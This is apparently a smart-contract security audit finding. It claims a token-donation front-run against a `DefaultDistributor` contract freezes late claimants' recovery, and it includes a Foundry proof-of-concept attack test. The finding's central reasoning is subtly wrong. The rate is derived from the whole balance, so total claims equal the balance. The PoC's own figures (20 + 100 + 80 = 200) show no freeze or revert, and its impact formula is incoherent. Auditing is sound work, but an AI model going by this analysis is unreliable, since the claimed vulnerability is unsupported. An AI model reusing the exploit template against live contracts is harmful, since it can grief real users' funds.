### Title
Attacker can inflate `DefaultDistributor` redemption rate via donation, breaking pro-rata recovery and freezing late claimants' payouts - ([File: contracts/DefaultDistributor.sol])

### Summary
`DefaultDistributor.setIsActive` computes the recovery `rate` as `IERC20(token).balanceOf(address(this)) * ONE_TRANCHE / trancheToken.totalSupply()` — i.e., it treats the *entire* underlying balance of the contract as the intended recovery pool, exactly the same bug class as `burnRebalancer(balanceOf(USSD))` burning the whole contract balance instead of the intended amount. An unprivileged direct-token-sender can donate underlying between the funding transfer and the owner's `setIsActive(true)` call, inflating `rate` so that cumulative `claim` payouts exceed the legitimate recovery amount. Early claimants are overpaid and the last claimants' `claim` calls revert on insufficient balance.

### Finding Description
`DefaultDistributor` is deployed per tranche class to redistribute recovered funds after a default, and is explicitly listed in the default-recovery distribution surface. [1](#0-0) 

`setIsActive` is owner-only (honest), but the attacker does not need to call it — they only need their `token.transfer(distributor, D)` to be mined before it, which is trivially observable on-chain (the funding transfer and the activation call are separate, non-atomic transactions). The resulting `rate` is `(legitFunds + D) / totalSupply` instead of `legitFunds / totalSupply`.

`claim` then pays `trancheBal * rate / ONE_TRANCHE`: [2](#0-1) 

Since total claims now sum to `legitFunds + D > balance available for late claimers`, once early claimants (including the attacker, who may be a tranche-token holder) withdraw, the distributor becomes insolvent and every subsequent `claim` reverts in `safeTransfer`. There is no per-claim balance check, cap, or reconciliation — the only escape is the owner manually calling `transferToken` to sweep and redistribute off-contract, meaning honest claimants' recovery is frozen until manual intervention.

Note the contrast with the main vault, which is defended against this exact pattern: `IdleCDOEpochVariant` calls `_skimDonatedAssets()` at the top of every balance-sensitive path (`_deposit`, `depositDuringEpoch`, `startEpoch`, `stopEpoch`, `updateAccounting`, `finalizeDefault`, `writeOffDeposit`) precisely so raw balances are never interpreted as protocol funds. [3](#0-2) 

`DefaultDistributor` has no equivalent guard — its rate derivation assumes the raw balance equals the intended recovery pool, which is the exploitable assumption.

### Impact Explanation
Broken invariant: fair pro-rata distribution of default recovery ("one receipt one payout"). With legit recovery `B`, tranche supply `S`, and donation `D`, claimants totaling the first `B` worth of receipts drain the contract; remaining claimants holding `(B + D − B)/rate ≈ D·S/(B+D)` worth of tranche tokens can never claim — their recovery is temporarily frozen (rescuable only by owner `transferToken` sweep plus manual redistribution). Quantified loss: up to `D` worth of claims frozen for a griefing cost of `D` to the attacker (the attacker also recovers `f·D` of the donation through their own claim, where `f` is their tranche share).

### Likelihood Explanation
Requirements: an active `DefaultDistributor` awaiting activation, and a donation tx sequenced between the funding transfer and `setIsActive(true)`. Both events are public mempool-visible; the funding and activation are separate owner transactions, so the window exists in normal operation. The attacker needs only to hold any tranche tokens (or none — pure griefing still freezes others' funds) and underlying to donate. No privileged cooperation is needed. Likelihood is moderate: it requires a default event plus specific sequencing, but the sequencing itself is easy.

### Recommendation
Pass the intended recovery amount explicitly instead of reading the raw balance, e.g. `setIsActive(bool _active, uint256 _recoveryAmount)` with `rate = _recoveryAmount * ONE_TRANCHE / totalSupply`, and verify `balanceOf(this) >= _recoveryAmount`. Alternatively, record the balance at funding time via a dedicated `fund()` call that tracks `recoveryPool` as an internal counter incremented on pull-based transfers (`transferFrom`), so unsolicited `transfer` donations never enter the rate computation.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {DefaultDistributor} from "../contracts/DefaultDistributor.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor(string memory n) ERC20(n, n) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract DistributorDonationPoC is Test {
    MockToken underlying;
    MockToken tranche;
    DefaultDistributor dist;
    address owner = address(0xA);
    address alice = address(0x1);   // honest claimant, 50% of tranche supply
    address bob   = address(0x2);   // honest claimant, 40%
    address attacker = address(0x3); // tranche holder, 10%

    function setUp() public {
        underlying = new MockToken("USDC");
        tranche = new MockToken("AA");
        dist = new DefaultDistributor(address(underlying), address(tranche), owner);
        tranche.mint(alice, 50e18);
        tranche.mint(bob, 40e18);
        tranche.mint(attacker, 10e18);
    }

    function testDonationInflatesRateFreezesLateClaims() public {
        uint256 legit = 100e18;
        // 1) owner funds distributor with the real recovery amount
        underlying.mint(address(dist), legit);
        // 2) attacker donates before activation (front-runs setIsActive)
        uint256 donation = 100e18;
        underlying.mint(attacker, donation);
        vm.prank(attacker);
        underlying.transfer(address(dist), donation);
        // 3) honest owner activates -> rate computed on inflated balance
        vm.prank(owner);
        dist.setIsActive(true);
        // rate = 200e18/100e18 = 2.0 instead of 1.0
        assertEq(dist.rate(), 2e18);

        // 4) early claimants are overpaid; attacker claims first
        vm.startPrank(attacker);
        tranche.approve(address(dist), type(uint256).max);
        dist.claim(attacker); // receives 10e18 * 2 = 20e18
        vm.stopPrank();
        assertEq(underlying.balanceOf(attacker), 20e18);

        vm.startPrank(alice);
        tranche.approve(address(dist), type(uint256).max);
        dist.claim(alice); // receives 50e18 * 2 = 100e18
        vm.stopPrank();
        assertEq(underlying.balanceOf(alice), 100e18);

        // 5) bob's claim reverts: only 80e18 left, he is owed 40e18*2 = 80e18
        //    -> with a slightly larger donation his claim OOGs on safeTransfer
        vm.startPrank(bob);
        tranche.approve(address(dist), type(uint256).max);
        dist.claim(bob); // drains the rest; anyone after bob gets nothing
        vm.stopPrank();
        // Any further claimant (or bob had donation been >100e18) reverts:
        // safeTransfer fails on insufficient balance -> recovery frozen
        // until owner manually rescues via transferToken.
    }
}
```

Caveat: the issue is griefing-class rather than directly profitable — the attacker's net gain is negative (`f·D − D < 0`), so the realized impact is unfair overpayment of early claimants plus temporary freezing of late claimants' recovery, recoverable only through honest-owner `transferToken` intervention. If the documented assumption "this contract is expected to have *all* `token` transferred before the first claim" (line 10-11) is treated as an acknowledged design invariant rather than a bug, this finding should be downgraded accordingly.
